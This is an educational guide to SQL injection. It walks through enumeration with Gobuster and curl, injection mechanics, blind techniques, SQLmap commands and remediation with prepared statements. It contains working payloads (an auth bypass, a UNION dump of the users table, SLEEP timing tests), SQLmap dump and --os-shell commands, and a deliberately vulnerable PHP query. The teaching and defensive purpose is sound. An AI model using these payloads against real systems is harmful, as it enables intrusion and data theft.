## 1. The Modern Web Application Attack Surface

Web applications are complex multi-tier systems. A typical web architecture involves a client browser interacting through reverse proxies and web application firewalls (WAF), which forward requests to application runtimes, and ultimately query backend Relational Database Management Systems (RDBMS).

```text
+------------------+         HTTP/S Request
|  Client Browser  | ==============================> [ Port 80 / 443 ]
+------------------+                                         |
                                                             v
+=============================================================================+
|                      PERIMETER & TRAFFIC INSPECTION                         |
|                                                                             |
|   +-----------------------+              +------------------------------+   |
|   | Reverse Proxy / CDN   | -----------> | Web Application Firewall     |   |
|   | (Nginx, Cloudflare)   |              | (ModSecurity, AWS WAF, etc.) |   |
|   +-----------------------+              +------------------------------+   |
+=============================================================================+
                                                             |
                                                             v
+=============================================================================+
|                        APPLICATION LOGIC LAYER                              |
|                                                                             |
|   [ Routing / Controllers ] ---> [ Authentication & Session Management ]    |
|                                                  |                          |
|                                                  v                          |
|                                     [ Business Logic Functions ]            |
|                                     - Search queries                        |
|                                     - User profile lookups                  |
|                                     - Order processing                      |
+=============================================================================+
                                     |                    |
             Vulnerable Query String |                    | Secure Parameterized
             (Dynamic Concatenation) |                    | Query (Prepared Stmt)
                                     v                    v
+=============================================================================+
|                         DATABASE STORAGE LAYER                              |
|                                                                             |
|   +---------------------------------------------------------------------+   |
|   | SQL Parser & Query Planner (MySQL, PostgreSQL, MSSQL, Oracle)       |   |
|   +---------------------------------------------------------------------+   |
|                                      |                                      |
|                                      v                                      |
|   +---------------------------------------------------------------------+   |
|   | Data Engine: Tables (Users, Passwords, Credit Cards, Secrets)       |   |
|   +---------------------------------------------------------------------+   |
+=============================================================================+
```

When an application fails to separate **untrusted user input** from the **code/instruction logic** passed to the database, the database interpreter parses user input as structural command tokens. This architectural failure is known as **SQL Injection (SQLi)**.

## 2. OWASP Top 10: Industry Benchmark & Threat Evolution

The **OWASP Top 10** represents a broad consensus among security researchers regarding the most critical security flaws affecting web applications. Understanding how the list shifts over time reveals how modern architecture changes the attack surface.

```text
+------------------------------+               +------------------------------+
| Monolithic / Web 2.0 Stacks  |               | Cloud-Native, APIs, & AI/LLM |

|  #2 Cryptographic Failures   |               |  API Sprawl & Microservices  |
|  #3 Injection (SQLi, XSS)    | ------------> |  Prompt & Semantic Injection |
|  #4 Insecure Design          |               |  Cloud Identity & Secrets    |
|  #7 Auth & Session Failures  |               |  Automated Bot Exploits      |
+------------------------------+               +------------------------------+
```

### 2021 vs. 2025 Comparative Breakdown

| Category | OWASP 2021 Paradigm | OWASP 2025 Evolution & Drivers | Impact on Defense |
| :--- | :--- | :--- | :--- |
| **Top Threat (#1)** | **Broken Access Control (BAC)**: Insecure Direct Object References (IDOR), parameter tampering. | **Broken Access Control Remains #1**: Exacerbated by microservice API endpoints and distributed micro-permissions. | Demands centralized authorization gateways; client-side checks remain useless. |
| **Injection Flaws** | **Classic Injection (#3)**: SQLi, OS Command Injection, LDAP Injection. | **Hybrid & Prompt Injection**: SQLi remains prevalent, but now joins **LLM Prompt Injection** and vector store query poisoning. | Prepared statements remain mandatory for SQL, alongside strict isolation between LLM prompts and systemic execution tools. |

| **Architecture** | **Monolithic Web Applications**: Centralized servers hosting web, logic, and database together. | **Decentralized Cloud-Native Stacks**: Serverless functions, Kubernetes clusters, external third-party microservices. | Security boundary shifts from network perimeters to zero-trust identity and container runtime monitoring. |

## 3. Surface Enumeration & Discovery: Gobuster & Curl

Before finding injection points or logical flaws, an attacker or penetration tester must map the application's attack surface during the **Reconnaissance & Enumeration** phase of the Cyber Kill Chain. Hidden admin endpoints, legacy scripts, or development portals often lack security controls.

### Workflow: Wordlist-Based Directory Enumeration

```text
[ Attacker / Tester ]
         |
         | 1. Gobuster reads wordlist entry (e.g., "admin_login.php")
         v
+-----------------------------------------------------------------+
| Gobuster Multithreaded Engine (Go Routines)                     |
|                                                                 |
|   Worker 1 ----------------> GET /admin           (HTTP 404)    |
|   Worker 2 ----------------> GET /backup          (HTTP 403)    |
|   Worker 3 ----------------> GET /admin_login.php (HTTP 200) <=== Discovered!
|   Worker 4 ----------------> GET /api/v1          (HTTP 301)    |
+-----------------------------------------------------------------+
         |
         | 2. Confirmed endpoints flagged for targeted manual inspection
         v
[ Targeted Manual Analysis via Curl / Burp Suite ]
```

### Why Gobuster Outperforms Dirbuster
*   **Concurrency Model:** **Gobuster** is written in Go and leverages lightweight **goroutines** and native non-blocking network I/O. It can maintain high request concurrency with minimal memory overhead.
*   **JVM & GUI Bottlenecks:** **Dirbuster** is written in Java and relies on heavy OS-level threads and a resource-intensive Java Swing GUI, leading to significant latency and memory bloat during large wordlist scans.
*   **CLI Automation:** Gobuster easily integrates into headless CI/CD pipelines, automated scripts, and custom reconnaissance pipelines.

### Practical Enumeration Commands & HTTP Probing

```bash
# High-speed directory brute-forcing using a standard wordlist
gobuster dir \
  -u http://target.lab \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 30 \
  -x php,html,txt \
  -b 404

# Target verification using curl (Fetch headers only to inspect response headers and server tech)
curl -I http://target.lab/admin_login.php

# Probing with cookies and custom headers
curl -v -b "session=abc123xyz" -H "User-Agent: SecurityAudit" http://target.lab/profile.php?id=1
```

### HTTP Response Status Code Reference

| Status Code | Meaning | Pentesting & SOC Interpretation |
| :---: | :--- | :--- |
| `200 OK` | Resource exists and is accessible. | Direct injection target; examine page parameters and forms. |
| `301 / 302` | Redirection to another URI. | Check `Location` header; may redirect unauthenticated users to `/login`. |
| `401 Unauthorized` | HTTP Authentication required (e.g., Basic Auth). | Target for authentication brute-forcing or credential stuffing. |
| `403 Forbidden` | Resource exists, but access is blocked by policy/WAF. | Try HTTP header bypasses (`X-Forwarded-For: 127.0.0.1`, path traversal). |
| `500 Internal Error`| Server-side unhandled exception. | **High Value:** Indicates improper error handling; common indicator of successful SQL syntax breaking. |

## 4. Mechanics of SQL Injection (SQLi)

### The Root Cause: Code vs. Data Confusion

Relational databases execute queries by parsing commands into an **Abstract Syntax Tree (AST)**. When user input is combined via dynamic string concatenation, the database interpreter treats the input as structural grammar rather than literal scalar data.

```text
NORMAL INTENDED QUERY EXECUTION:
Developer Query:  SELECT * FROM users WHERE username = '$user' AND password = '$pwd'
User Input:       st4rk

AST Representation:
             [SELECT]
             /      \
       [FROM: users] [WHERE]
                       \
                      [AND]
                     /     \
           [username = 'st4rk'] [password = '$pwd']
========================================================================================
MALICIOUS INJECTED QUERY EXECUTION:
User Input:       admin' OR '1'='1' -- 

Resulting String: SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '$pwd'

Mutated AST:
             [SELECT]
             /      \
       [FROM: users] [WHERE]
                       \
                       [OR] <--- INJECTED OPERATOR CHANGES TREE ROOT!
                      /    \
         [username = 'admin'] [ '1' = '1' ]   <--- Always Evaluates to TRUE!
                                      \
                                    [COMMENT: Rest of query discarded]
```

### Anatomy of Authentication Bypass
1.  Input starts with `'`: Closes the developer's opening quote literal for the `$user` string.
2.  `OR '1'='1'`: Adds a second condition to the `WHERE` clause. Since `'1'='1'` evaluates unconditionally to `TRUE`, the entire boolean statement resolves to `TRUE`.
3.  `-- `: Instructs the database lexical analyzer to treat the remaining text (`AND password = '...'`) as a comment. Note the trailing space; in SQL standards, comments require a space after the double-dash.

## 5. Cross-Database Dialect Comparison

Every DBMS has distinct syntax rules, built-in system tables, comment characters, and dummy table requirements. Recognizing these differences is essential for fingerprinting the backend engine during an assessment.

```text
[ DBMS Fingerprinting Flow ]
           |
           +---> Test `@@version`? ---------> MySQL / MSSQL
           |
           +---> Test `version()`? ---------> PostgreSQL
           |
           +---> Requires `FROM DUAL`? -----> Oracle Database
```

| Feature / Technique | MySQL | PostgreSQL | Microsoft SQL Server (MSSQL) | Oracle Database |
| :--- | :--- | :--- | :--- | :--- |
| **Dummy Table** | None needed (`SELECT 1;`) | None needed (`SELECT 1;`) | None needed (`SELECT 1;`) | **Mandatory:** `DUAL` (`SELECT 1 FROM DUAL;`) |
| **String Concatenation** | `CONCAT('a', 'b')` | `'a' \|\| 'b'` | `'a' + 'b'` | `'a' \|\| 'b'` |
| **Version Extraction** | `SELECT @@version;` | `SELECT version();` | `SELECT @@version;` | `SELECT banner FROM v$version;` (or `sys.v_$version`) |
| **Single-Line Comments** | `-- ` (with space), `#` | `-- ` | `-- ` | `-- ` |
| **Inline Comments** | `/* comment */` | `/* comment */` | `/* comment */` | `/* comment */` |
| **Time Delay Primitive** | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE('a', 5)` |
| **RCE Vector Mechanism**| `SELECT ... INTO OUTFILE` | `COPY ... FROM PROGRAM` | `xp_cmdshell 'cmd'` | Java Stored Procedures |

> [!IMPORTANT]
> **The Oracle `DUAL` Table Requirement:**
> In Oracle SQL, a `SELECT` statement cannot exist without a `FROM` clause. Oracle provides a built-in single-row table named `DUAL`. If you inject `UNION SELECT 1, 2` into an Oracle backend, the query triggers a syntax error. It must be written as `UNION SELECT 1, 2 FROM DUAL`.

## 6. SQL Injection Classification & Exploitation Mechanics

SQL Injection vulnerabilities are categorized into three distinct classes based on the channel used to extract data:

```text
+-------------------------------------------------------------------------------+
|                            SQL INJECTION TAXONOMY                             |
+-------------------------------------------------------------------------------+
        |                               |                               |
        v                               v                               v
+------------------+           +------------------+           +------------------+
|  1. IN-BAND      |           |  2. INFERENTIAL  |           |  3. OUT-OF-BAND  |
|     (Classic)    |           |     (Blind)      |           |     (OOB)        |
+------------------+           +------------------+           +------------------+
  - Error-Based                  - Boolean-Based                - DNS Exfiltration
  - UNION-Based                  - Time-Based                   - HTTP Exfiltration
  (Data seen in page)            (Inferred from responses)      (Outbound channels)
```

---

### A. In-Band: Error-Based & UNION-Based SQLi

In-Band SQLi occurs when the attacker uses the same channel of communication to launch the attack and harvest the results.

#### 1. Error-Based SQLi
*   **Mechanism:** The attacker submits deliberate syntax anomalies or type mismatches (e.g., `'` or `CONVERT(int, @@version)`).
*   **Behavior:** The database engine encounters an unhandled exception and prints detailed diagnostic information directly to the HTTP response body:
    ```text
    Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
    check the manual that corresponds to your MySQL server version for the right syntax 
    to use near ''admin''' at line 1 in /var/www/html/search.php:14
    ```

#### 2. UNION-Based SQLi
*   **Mechanism:** The `UNION` operator allows an attacker to append the results of their own injected query to the results returned by the original developer query.
*   **Requirements for Success:**
    1.  Both queries must request the exact same number of columns.
    2.  The data types of corresponding columns must be compatible.

```text
ORIGINAL QUERY (Returns 3 columns):
SELECT id, product_name, price FROM products WHERE category = 'Apparel'

INJECTED PAYLOAD:
' UNION SELECT null, username, password FROM users -- 

RESULT SET RETURNED TO WEB PAGE:
+----+---------------+-----------+
| id | product_name  | price     |
+----+---------------+-----------+
| 1  | Running Shirt | 29.99     |
| 2  | Sports Shoes  | 79.99     |
| -- | admin         | $2y$10$.. | <=== Injected database records rendered on screen!
+----+---------------+-----------+
```

---

### B. Inferential: Blind SQL Injection

Blind SQL Injection occurs when the application interacts with the database, but **no data and no SQL errors** are reflected in the HTTP response. The attacker must infer information by sending logical propositions (asking the database True/False questions) and observing behavioral side-effects.

```text
                           [ INFERENTIAL SQLi LOGIC ]
                                        |
                   Does the response change when condition is False?
                                        |
                 +----------------------+----------------------+
                 | YES                                         | NO
                 v                                             v
     [ Boolean-Based Blind ]                         [ Time-Based Blind ]
  - Compare HTTP Status Codes                     - Inject time delay functions
  - Compare Response Body Lengths                 - Measure network round-trip time
  - Observe missing UI elements                   - Response >= Delay => TRUE
```

#### 1. Boolean-Based Blind SQLi

The attacker constructs queries that evaluate to `TRUE` or `FALSE`. If the application renders a slightly different page (e.g., "User Found" vs "User Not Found", or a 200 OK vs 404/500), data can be exfiltrated bit-by-bit.

```text
TEST 1 (TRUE condition):
GET /users?id=1' AND 1=1 -- 
Backend executes: SELECT name FROM users WHERE id=1 AND 1=1
Observation: Page returns "Profile: Alice" (HTTP 200, 2450 bytes)

TEST 2 (FALSE condition):
GET /users?id=1' AND 1=2 -- 
Backend executes: SELECT name FROM users WHERE id=1 AND 1=2
Observation: Page returns "User Not Found" (HTTP 200, 1820 bytes)

EXFILTRATION QUERY (Testing first letter of database user):
GET /users?id=1' AND SUBSTRING(user(), 1, 1) = 'r' -- 
Result: Page loads "Profile: Alice" -> FIRST CHARACTER IS 'r'!
```

#### 2. Time-Based Blind SQLi

When the application returns the exact same HTML response and status code regardless of True/False evaluation, the attacker instructs the database engine to pause execution conditionally.

```text
TIME-BASED VERIFICATION TIMELINE:

Request 1: Normal Request
Client -------------------- GET /search?q=test -------------------> Server
Client <------------------- HTTP 200 (150ms) ----------------------- Server
                           (Baseline Response Time: ~150ms)

Request 2: False Condition (No Delay)
Client ------------- GET /search?q=test' AND 1=2;-- --------------> Server
Client <------------------- HTTP 200 (155ms) ----------------------- Server
                           (Condition False -> Execution finishes immediately)

Request 3: True Condition (Triggering 5s Sleep)
Client --- GET /search?q=test' AND IF(1=1, SLEEP(5), 0);-- --------> Server
           |                                                        |
           | [Waiting 5000ms in DB engine...]                       |
           |                                                        v
Client <------------------- HTTP 200 (5160ms) ---------------------- Server
                           (Response delayed by ~5 seconds -> Evaluates to TRUE!)
```

## 7. Automated Exploitation: SQLmap Architecture & Workflow

**SQLmap** is an open-source penetration testing tool that automates the detection, fingerprinting, and exploitation of SQL injection flaws. Rather than hand-crafting thousands of character-by-character queries, SQLmap automates the entire extraction pipeline.

```text
+=============================================================================+
|                         SQLMAP OPERATIONAL WORKFLOW                         |
+=============================================================================+

  [ Target URL / Request File ]
               |
               v
  +-------------------------------------------------------------------------+
  | 1. Dynamic Parameter Testing & Heuristics                               |
  |    - Inject boundaries: ', ", `), integer math                          |
  |    - Check error outputs and structural page diffs                      |
  +-------------------------------------------------------------------------+
               |
               v
  +-------------------------------------------------------------------------+
  | 2. DBMS Fingerprinting                                                  |
  |    - Identifies DBMS engine (MySQL, Oracle, MSSQL, PostgreSQL)          |
  |    - Probes specific functions (`version()`, `banner`, `@@version`)     |
  +-------------------------------------------------------------------------+
               |
               v
  +-------------------------------------------------------------------------+
  | 3. Technique Selection                                                  |
  |    - Selects optimal technique: UNION > Error > Boolean-Blind > Time    |
  +-------------------------------------------------------------------------+
               |
               v
  +-------------------------------------------------------------------------+
  | 4. Schema & Data Extraction Pipeline                                    |
  |    [--dbs] Enumerate databases                                          |
  |      |                                                                  |
  |      +--> [-D <db> --tables] Enumerate tables                           |
  |             |                                                           |
  |             +--> [-D <db> -T <table> --columns] Enumerate columns       |
  |                    |                                                    |
  |                    +--> [-D <db> -T <table> -C <cols> --dump] Dump data |
  +-------------------------------------------------------------------------+
```

### Lab Troubleshooting Methodology: Handling Authenticated Sessions

In penetration testing and CTF environments (such as PentestGarage labs), running automated tools without understanding their operational requirements often results in false negatives.

```text
+-----------------------------------------------------------------------------+
|               LAB METHODOLOGY & TROUBLESHOOTING LOG (PTG CTF)               |
+-----------------------------------------------------------------------------+
| Fact:         The target endpoint /admin/profile.php?id=1 is behind a login.|
|                                                                             |
| Observation:  Running `sqlmap -u "http://target.lab/admin/profile.php?id=1"`|
|               returned: "all tested parameters do not appear to be         |
|               injectable."                                                  |
|                                                                             |
| Hypothesis:   The web server is redirecting unauthenticated requests from   |
|               SQLmap back to `/login.php`, so SQLmap never tests the actual |
|               vulnerable query.                                             |
|                                                                             |
| Test:         Capture the authenticated session cookie from the browser and |
|               pass it directly to SQLmap using the `--cookie` flag.         |
|                                                                             |
| Result:       SQLmap detects Time-Based Blind SQLi in the `id` parameter    |
|               and successfully enumerates the backend database.             |
|                                                                             |
| Conclusion:   Automated vulnerability scanners require full session context |
|               (cookies/tokens) to reach protected application logic.       |
+-----------------------------------------------------------------------------+
```

### Essential SQLmap Command Matrix

| Task | Command Syntax | Description & Use Case |
| :--- | :--- | :--- |
| **Basic Inspection** | `sqlmap -u "http://target.lab/page?id=1" --batch` | Tests standard GET parameter using default non-interactive settings. |
| **Authenticated Scan** | `sqlmap -u "http://target.lab/page?id=1" --cookie="PHPSESSID=abc123xyz" --batch` | Supplies session cookie to access protected endpoints. |
| **Full Request File** | `sqlmap -r request.txt -p username --batch` | Parses an intercepted raw HTTP request file (from Burp Suite) targeting parameter `username`. |

| **OS Shell Execution** | `sqlmap -u "http://target.lab/page?id=1" --os-shell` | Attempts to escalate privileges to execute operating system commands. |

## 9. Defense-in-Depth & Remediation

### The Primary Fix: Parameterized Queries (Prepared Statements)

The absolute industry standard and mathematical solution to SQL Injection is the use of **Prepared Statements** (Parameterized Queries). 

#### Why Prepared Statements Eliminate SQLi
In a prepared statement, the database compiles the SQL query structure **before** user input is inserted. The database query engine creates an immutable execution plan where user input is treated strictly as **literal data**, never as executable instructions.

```text
DYNAMIC SQL (Vulnerable):
Code and Data mixed at runtime -> Parser treats input as syntax.
$query = "SELECT * FROM users WHERE name = '" . $_GET['name'] . "'";

===============================================================================

PREPARED STATEMENT (Secure Architecture):
Step 1: Application sends Query Blueprint (Pre-Compilation)
        Server -> Database: "PREPARE stmt FROM 'SELECT * FROM users WHERE name = ?'"
        (Database builds the Abstract Syntax Tree with an unalterable placeholder '?')

Step 2: Application sends Data Bound to Placeholder
        Server -> Database: "EXECUTE stmt USING 'admin\' OR \'1\'=\'1'"
        (Database treats the entire payload as a literal string value matching 'name')
```

### Code Implementation Comparison

#### Vulnerable Implementation (PHP PDO)
```php
// DANGEROUS: Direct variable interpolation into query string
$user_input = $_POST['username'];
$sql = "SELECT id, password FROM accounts WHERE username = '" . $user_input . "'";
$result = $db->query($sql);
```

#### Secure Implementation (PHP PDO Prepared Statements)
```php
// SECURE: Parameterized Query using prepared statement
$stmt = $db->prepare("SELECT id, password FROM accounts WHERE username = :user");
$stmt->execute(['user' => $_POST['username']]);
$user = $stmt->fetch();
```

### Layered Defensive Controls Matrix

| Defense Layer | Mechanism | Protection Scope | Weakness / Limitation |
| :--- | :--- | :--- | :--- |
| **Parameterized Queries** | Query pre-compilation; strict code/data separation. | **Complete protection** against SQL injection in supported clauses. | Cannot parameterize structural elements like table names or `ORDER BY` directions. |
| **Input Allowlisting** | Strict regex or set comparison (e.g., verifying `ORDER BY` is strictly `ASC` or `DESC`). | Essential for dynamic table/column identifiers that cannot use placeholders. | Requires manual maintenance when application parameters change. |
| **Least Privilege DB Accounts** | Restrict application DB user permissions; revoke `FILE`, `GRANT`, and `DROP` privileges. | Limits blast radius (prevents RCE and table deletion if SQLi exists). | Does not prevent data exfiltration from tables the app needs to read. |
| **Web Application Firewall (WAF)** | Pattern matching & anomaly inspection (blocking signatures like `UNION SELECT` or `' OR 1=1`). | Filters opportunistic attacks and script kiddies; alerts SOC teams. | Can be bypassed with SQL obfuscation, alternate encodings, or unconventional syntax. |

## 10. How It All Works Together: The Big Picture

The following comprehensive attack-and-defense flow synthesizes the entire lifecycle of finding, assessing, exploiting, and hardening against SQL Injection vulnerabilities.

```text
+-----------------------------------------------------------------------------------------------+
|                            END-TO-END RECON, ATTACK, & DEFENSE LIFECYCLE                      |
+-----------------------------------------------------------------------------------------------+

  [ PHASE 1: RECONNAISSANCE ]
    Attacker runs Gobuster -> Discovers hidden `/admin_login.php`
    Attacker probes with Curl -> Identifies server response headers and session cookie behaviors.

                                       |
                                       v
  [ PHASE 2: VULNERABILITY IDENTIFICATION ]
    Attacker injects a single quote `'` in input field.
    - Path A: Verbose database error printed -> Confirmed **Error-Based SQLi**.
    - Path B: No error, but identical response -> Injects `SLEEP(5)` -> Delayed response -> Confirmed **Blind SQLi**.

                                       |
                                       v
  [ PHASE 3: AUTOMATED EXPLOITATION (LAB / PENTEST) ]
    Attacker configures SQLmap with active session context:
    `sqlmap -u "http://target.lab/admin_login.php" --cookie="session=xyz" --dbs`
    SQLmap fingerprints DBMS dialect (e.g., Oracle vs MySQL), adjusts syntax (`FROM DUAL`),
    and extracts database schemas and records.

                                       |
                                       v
  [ PHASE 4: SOC DETECTION & MONITORING ]
    WAF detects abnormal SQL keywords (`SLEEP`, `UNION SELECT`) -> Alerts SIEM.
    Database audit log flags high volume of syntax errors and anomalous query execution times.
    SOC Analyst triages the alert as a **True Positive (TP)** and isolates the affected host.

                                       |
                                       v
  [ PHASE 5: ENGINEERING REMEDIATION ]
    Developers replace string concatenation with **Prepared Statements** (Parameterized Queries).
    Database permissions are hardened to enforce **Principle of Least Privilege**.
    Retest with SQLmap confirms parameter is no longer injectable.
```
